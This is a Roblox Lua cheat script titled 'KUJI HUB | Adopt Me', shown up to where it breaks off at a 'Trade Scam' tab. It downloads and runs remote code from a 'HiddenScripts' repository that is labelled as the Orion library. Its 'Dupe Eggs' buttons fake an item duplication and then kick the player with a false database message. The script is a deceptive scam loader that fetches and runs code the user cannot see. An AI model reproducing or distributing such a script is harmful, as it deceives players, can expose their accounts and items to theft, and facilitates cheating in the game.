-- Load the Orion library
local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
-- Create the main window
local Window = OrionLib:MakeWindow({
    Name = "KUJI HUB | Adopt Me",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionTest"
})

-- Initialize GUI setting
getgenv().gui = false
loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingHubs/HiddenScripts/main/Orion-librarysource"))()

-- Create "Dupe Eggs" tab
local Tab = Window:MakeTab({
    Name = "Dupe Eggs",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "Equipped Eggs To Dupe",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "Egg Selector",
            Content = "Egg Selected!!!!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

Tab:AddButton({
    Name = "Click To Dupe Eggs",
    Callback = function()
        game.Players.LocalPlayer:Kick("Egg Stored In Adopt Me Database!.")
    end
})

-- Create "Trade Scam" tab
Tab = Window:MakeTab({
